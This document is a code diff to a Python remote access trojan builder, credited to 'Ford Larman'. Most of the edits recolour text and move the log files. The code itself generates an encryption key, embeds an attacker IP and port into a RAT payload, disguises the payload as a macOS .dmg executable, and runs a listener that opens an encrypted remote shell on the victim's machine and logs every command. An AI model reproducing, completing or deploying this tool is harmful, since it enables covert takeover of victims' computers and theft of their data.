@@ -5,24 +5,21 @@ import socket
 import struct
 import sys
 
-
+from colored import fg, attr
 from cryptography.fernet import Fernet
 
-#### text colours
-'text colour codes:'
+#### text colours - hex
 'red'
-CRED = '\033[91m'
-'end'
-CEND = '\033[0m'
+CRED = fg('#D8002B') #not red enough!
 'blue'
-CBLU = '\33[96m'
-'magenta'
-CMAN = '\33[95m'
+CBLU = fg('#0A31CE') #purple...
+'purple'
+CYEL = fg('#7B6ED6')
+'green'
+CGREEN = fg('#31CE0A')
 'yellow'
-CYEL = '\33[33m'
-'backg'
-CGREY = '\33[44m'
-
+CPUR = fg('#7B6ED6')
+res = attr('reset')
 
 '#### - SYMMETRIC ENCRYPTION - ####'
 # Generate Key:
@@ -32,7 +29,7 @@ def generate_key():
     with open("Jonesy_cat.key", "wb") as key_file:
          key_file.write(key)
     print("New key is saved in 'Jonesy_cat.key' file.")
-    print(CYEL + "'" + key.decode() + "'" + CEND)
+    print("'" + key.decode() + "'")
     menu()
 
 '# Read Key:'
@@ -67,24 +64,24 @@ def read_code():
 def banner():
     print("")
     print("")
-    print("     ____._______                                 _________         __   ")
+    print(CGREEN + "     ____._______                                 _________         __   ")
     print("    |    |\\   _  \\   ____   ______ ____ ___.__.   \\_   ___ \\_____ _/  |_ ")
     print("    |    |/  /_\\  \\ /    \\ /  ___// __ <   |  |   /    \\  \\/\\__  \\\\   __\\ ")
     print("/\\__|    |\\  \\_/   \\   |  \\___ \\ \\  ___/\\___  |   \\     \\____/ __ \\|  |  ")
     print("\\________| \\_____  /___|  /____  >\\___  > ____|____\\______  (____  /__|  ")
     print("                 \\/     \\/     \\/     \\/\\/   /_____/      \\/     \\/      ")
-    print("----------------------------created by Ford Larman-----------------------")
+    print(CRED + "######################## " + CBLU + "created by Ford Larman" + CRED+ " ########################")
     menu()
 
 '# Menu'
 def menu():
     print("\n")
-    print("---Menu---")
-    print("1." + CYEL + " Generate Encryption Key" + CEND)
-    print("2." + CYEL + " Create Trojan Executable" + CEND)
-    print("3." + CYEL + " Connect to Target" + CEND)
-    print("type 'exit' to exit")
-    select = input(">>>: ")
+    print(CGREEN + "---Menu---")
+    print(CRED + "1." + CBLU + " Generate Encryption Key")
+    print(CRED + "2." + CBLU + " Create .dmg")
+    print(CRED + "3." + CBLU + " Connect to Target")
+    print(CRED + "type 'exit' to exit")
+    select = input(CGREEN + ">>>: " + res)
     if select == "3":
         find_Server()
     elif select == "2":
@@ -92,10 +89,10 @@ def menu():
     elif select == "1":
         generate_key()
     elif select == "exit":
-        print(CRED + "[!] Shutting Down" + CEND)
+        print(CRED + "[!] Shutting Down")
         sys.exit()
     else:
-        print(CRED + "[!] Bad Input" + CEND)
+        print(CRED + "[!] Bad Input")
 
 
 '# Connect to Server'
@@ -104,29 +101,29 @@ def find_Server():
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     print("\n")
-    print(">>> Connecting to Target")
+    print(CGREEN + ">>> Connecting to Target")
 
     '#### Enter you local IP and port ####'
-    ip = input("Enter IP: ")
-    port = input("Enter Port number: ")
+    ip = input("Enter IP: " + res)
+    port = input(CGREEN + "Enter Port number: " + res)
     ss.bind((ip, int(port)))
-    print(CBLU + "[+] Server On" + CEND)
+    print(CRED + "[+]" + CBLU + " Server On")
     ss.listen(5)
-    print(CBLU + "[+] LISTENING..." + CEND)
+    print(CRED + "[+]" + CBLU + " LISTENING...")
     (clientsocket, address) = ss.accept()
-    print(CBLU + "[+] Target CONNECTED!" + CEND)
-    print(CBLU + "[+] @ " + str(address) + CEND)
+    print(CPUR + "[+]" + CBLU + "Target CONNECTED!")
+    print(CPUR + "[+]" + CBLU + " @ " + str(address))
     backdoor(clientsocket, ss)
 
 ###NEEDS WORK TO BE SOMETHING LEGITIMATE###
 # Make executable file a MacOS specific file. Not python file.
 '# Create rat file'
 def create_rat():
-    print(CBLU + "\n[+] Creating RAT Executable" + CEND)
-    print("Please Enter Your designated machine details.")
-    ip = input(">>> IP address: ")
-    port = input(">>> Destination port : ")
-    name = input("enter file name: ")
+    print(CPUR + "\n[+] Creating RAT Executable")
+    print(CGREEN + "Please Enter Your designated machine details." + res )
+    ip = input(CGREEN + ">>> IP address: " + res)
+    port = input(CGREEN + ">>> Destination port : "+ res)
+    name = input(CGREEN + "enter file name: "+ res)
     full_name = name + ".py"
     current_key = read_key()
     code = read_code()
@@ -146,10 +143,10 @@ def create_rat():
                 f.writelines("        port = " + port + "\n")
             else:
                 f.writelines(line)
-    print(CBLU + "[+] Writing Executable..." + CEND)
+    print(CPUR + "[+] Writing Executable...")
     # disguise socket as executable
     make_dmg_file(name)
-    print(CBLU + "[+] Executable " + name + " created" + CEND)
+    print(CPUR + "[+] Executable " + name + " created")
     menu()
 
 'convert python file to executable'
@@ -178,16 +175,16 @@ def backdoor(client, ss):
     print("\n")
     date = datetime.datetime.now()
     logName = str(date) + ".txt"
-    with open(logName, "w") as f:
+    with open('logs/' + logName, "w") as f:
         f.writelines("JC--LOG FILE: " + str(date) + "\n")
         f.close()
     while True:
-        shell = input(CRED + "Shell>>>" + CEND)
+        shell = input(CRED + "Shell>>>" + res)
         if shell == "exit":
-            print(CBLU + "[+] Closing connection!\n" + CEND)
+            print(CPUR + "[+]"+ CBLU + "Closing connection!\n")
             client.close()
             ss.close()
-            with open(logName, "a") as f:
+            with open('logs/' + logName, "a") as f:
                 f.writelines("***Transmission Ended***")
                 f.close()
             menu()
@@ -218,13 +215,12 @@ def backdoor(client, ss):
             client.sendall(message)
             #receive data
             data = client.recv(4096)
-
             #decrypt data
             rcv_message = decrypt_mess(data)
             #print message decoded
-            print(CYEL + rcv_message.decode() + CEND)
+            print(rcv_message.decode())
             #Log file
-            with open(logName, "a") as f:
+            with open('logs/' +logName, "a") as f:
                 f.writelines("Shell>>>" + shell + "\n")
                 f.writelines(rcv_message.decode())
                 f.writelines("\n")
